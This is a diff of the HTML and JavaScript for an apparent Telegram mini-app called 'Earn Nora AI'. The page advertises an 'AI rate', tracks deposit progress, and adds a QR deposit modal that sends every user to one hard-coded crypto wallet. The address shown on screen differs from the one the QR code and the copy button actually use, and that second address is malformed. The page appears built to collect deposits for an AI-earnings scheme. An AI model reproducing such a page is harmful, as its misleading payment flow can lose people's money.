@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport"
-content="width=device-width,initial-scale=1.0,user-scalable=no">
+content="width=device-width,initial-scale=1.0">
 
 <title>Earn Nora AI</title>
 
@@ -18,7 +18,7 @@ box-sizing:border-box;
 }
 
 body{
-font-family:Arial,sans-serif;
+font-family:Arial;
 background:#050814;
 color:white;
 padding:18px 18px 90px;
@@ -33,7 +33,7 @@ margin-bottom:25px;
 
 .logo{
 font-size:34px;
-font-weight:700;
+font-weight:bold;
 }
 
 .logo span{
@@ -61,21 +61,18 @@ text-align:center;
 }
 
 .card h2{
-margin-bottom:8px;
 color:#00ff88;
-font-size:20px;
+margin-bottom:8px;
 }
 
 .deposit-box{
 background:linear-gradient(
-90deg,
-#2a1c10,
-#1b1220
+90deg,#2a1c10,#1b1220
 );
-border:1px solid #4e3620;
 padding:20px;
 border-radius:24px;
 margin-bottom:25px;
+border:1px solid #4e3620;
 }
 
 .progress{
@@ -83,7 +80,7 @@ height:8px;
 background:#222;
 border-radius:30px;
 overflow:hidden;
-margin-top:14px;
+margin-top:15px;
 }
 
 .bar{
@@ -93,9 +90,9 @@ background:#00ff88;
 }
 
 .section{
-margin-top:22px;
 font-size:22px;
 font-weight:bold;
+margin-top:25px;
 }
 
 .assets{
@@ -107,17 +104,15 @@ margin-top:18px;
 
 .asset{
 background:#0d1324;
-border:2px solid transparent;
+padding:20px 10px;
 border-radius:18px;
-padding:18px 10px;
 text-align:center;
+border:2px solid transparent;
 cursor:pointer;
-transition:.2s;
 }
 
 .asset.active{
 border-color:#00ff88;
-background:#101a34;
 }
 
 .coin{
@@ -131,26 +126,24 @@ margin-top:22px;
 
 .amountBox input{
 width:100%;
-padding:16px;
-border:none;
-border-radius:16px;
+padding:15px;
 margin-top:12px;
+border:none;
+border-radius:14px;
 background:#11192d;
 color:white;
-font-size:17px;
 }
 
 .depositBtn{
 width:100%;
-margin-top:20px;
 padding:18px;
+margin-top:20px;
 border:none;
 border-radius:18px;
-font-size:18px;
-font-weight:bold;
 background:#00ff88;
 color:black;
-cursor:pointer;
+font-size:18px;
+font-weight:bold;
 }
 
 .bottomnav{
@@ -165,10 +158,73 @@ padding:18px;
 font-size:24px;
 }
 
+
+
+/* QR MODAL */
+
+#depositModal{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#050814;
+z-index:9999;
+overflow:auto;
+padding:25px;
+}
+
+.walletCard{
+background:#0d1324;
+padding:25px;
+border-radius:24px;
+text-align:center;
+margin-top:25px;
+}
+
+.qr{
+width:230px;
+background:white;
+padding:12px;
+border-radius:20px;
+margin-top:20px;
+}
+
+.addr{
+width:100%;
+padding:14px;
+margin-top:18px;
+background:#11192d;
+color:#00ff88;
+border:none;
+border-radius:12px;
+}
+
+.actionBtn{
+width:100%;
+padding:16px;
+margin-top:18px;
+border:none;
+border-radius:16px;
+font-weight:bold;
+}
+
+.paidBtn{
+background:#00ff88;
+color:black;
+}
+
+.closeBtn{
+background:#222;
+color:white;
+}
+
 </style>
 </head>
 
 <body>
+
 
 <div class="top">
 <div class="logo">
@@ -179,6 +235,7 @@ Earn<span>Nora</span> AI
 🔔
 </div>
 </div>
+
 
 
 <div class="stats">
@@ -195,10 +252,11 @@ Users
 
 <div class="card">
 <h2>67%</h2>
-AI Win Rate
+AI Rate
 </div>
 
 </div>
+
 
 
 <div class="deposit-box">
@@ -209,8 +267,9 @@ AI Win Rate
 </div>
 
 <div style="margin-top:12px">
-12 / 30 USDT Progress
+12 / 30 Deposited
 </div>
+
 </div>
 
 
@@ -218,6 +277,7 @@ AI Win Rate
 <div class="section">
 Select Asset
 </div>
+
 
 <div class="assets">
 
@@ -254,16 +314,15 @@ TRON
 </div>
 
 
+
 <div class="amountBox">
 Deposit Amount
 
 <input
 id="amount"
 type="number"
-value="30"
-placeholder="Enter USDT">
+value="30">
 </div>
-
 
 
 <button
@@ -271,6 +330,70 @@ class="depositBtn"
 onclick="depositNow()">
 DEPOSIT NOW
 </button>
+
+
+
+
+<!-- QR DEPOSIT PAGE -->
+<div id="depositModal">
+
+<h2>
+Deposit Crypto
+</h2>
+
+<div class="walletCard">
+
+<div style="
+color:#00ff88;
+font-weight:bold;
+">
+✓ Permanent Wallet Address
+</div>
+
+
+<img
+id="qrImg"
+class="qr"
+src=""
+>
+
+
+<div style="margin-top:18px">
+Deposit Address
+</div>
+
+<input
+id="walletAddress"
+class="addr"
+readonly
+value="0xf1D8711cBDb90dc4eF4cb0E9194c768dCF14A3A1"
+>
+
+
+<button
+class="actionBtn"
+onclick="copyAddress()">
+Copy Address
+</button>
+
+
+<button
+class="actionBtn paidBtn"
+onclick="confirmPaid()">
+I PAID
+</button>
+
+
+<button
+class="actionBtn closeBtn"
+onclick="closeDeposit()">
+Close
+</button>
+
+</div>
+
+</div>
+
 
 
 <div class="bottomnav">
@@ -286,36 +409,32 @@ DEPOSIT NOW
 <script>
 
 const tg=window.Telegram.WebApp;
-
 tg.ready();
 tg.expand();
 
 let selectedAsset="USDT";
 
+const walletAddress=
+"0x7941a60bacffcc9f3ecff25ccaee6a3c6fe9";
 
-// asset select
-document.querySelectorAll('.asset')
+
+
+document.querySelectorAll(".asset")
 .forEach(asset=>{
 
 asset.onclick=function(){
 
-document.querySelectorAll('.asset')
+document.querySelectorAll(".asset")
 .forEach(
-x=>x.classList.remove('active')
+x=>x.classList.remove("active")
 );
 
-this.classList.add('active');
+this.classList.add(
+"active"
+);
 
 selectedAsset=
-this.innerText
-.trim()
-.split("\n")
-.pop();
-
-if(tg.HapticFeedback){
-tg.HapticFeedback
-.impactOccurred('medium');
-}
+this.innerText.trim().split("\n").pop();
 
 };
 
@@ -323,7 +442,7 @@ tg.HapticFeedback
 
 
 
-// deposit function
+
 function depositNow(){
 
 let amount=
@@ -331,52 +450,84 @@ document.getElementById(
 "amount"
 ).value;
 
-
 if(!amount || amount<=0){
+
 tg.showAlert(
-"Enter valid amount"
+"Enter amount"
 );
+
 return;
 }
 
-tg.MainButton
-.setText(
-"Creating Deposit..."
-)
-.show();
+
+// generate qr
+document.getElementById(
+"qrImg"
+).src=
+
+"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data="
++
+walletAddress;
 
 
-const payload={
-action:"deposit",
+document.getElementById(
+"depositModal"
+).style.display="block";
+
+}
+
+
+
+function copyAddress(){
+
+navigator.clipboard.writeText(
+walletAddress
+);
+
+tg.showAlert(
+"Address copied"
+);
+
+}
+
+
+
+function closeDeposit(){
+
+document.getElementById(
+"depositModal"
+).style.display="none";
+
+}
+
+
+
+function confirmPaid(){
+
+let amount=
+document.getElementById(
+"amount"
+).value;
+
+
+tg.sendData(
+JSON.stringify({
+action:"deposit_check",
 asset:selectedAsset,
 amount:amount,
-plan:"Silver Bonus"
-};
-
-
-// sends to python bot
-tg.sendData(
-JSON.stringify(payload)
+wallet:walletAddress
+})
 );
 
 
-setTimeout(()=>{
-
 tg.showPopup({
-title:"Deposit Submitted",
+title:"Payment Submitted",
 message:
-amount+
-" "+
-selectedAsset+
-" request sent successfully.",
+"Deposit sent for verification.",
 buttons:[
-{
-type:"ok"
-}
+{type:"ok"}
 ]
 });
-
-},500);
 
 }
 
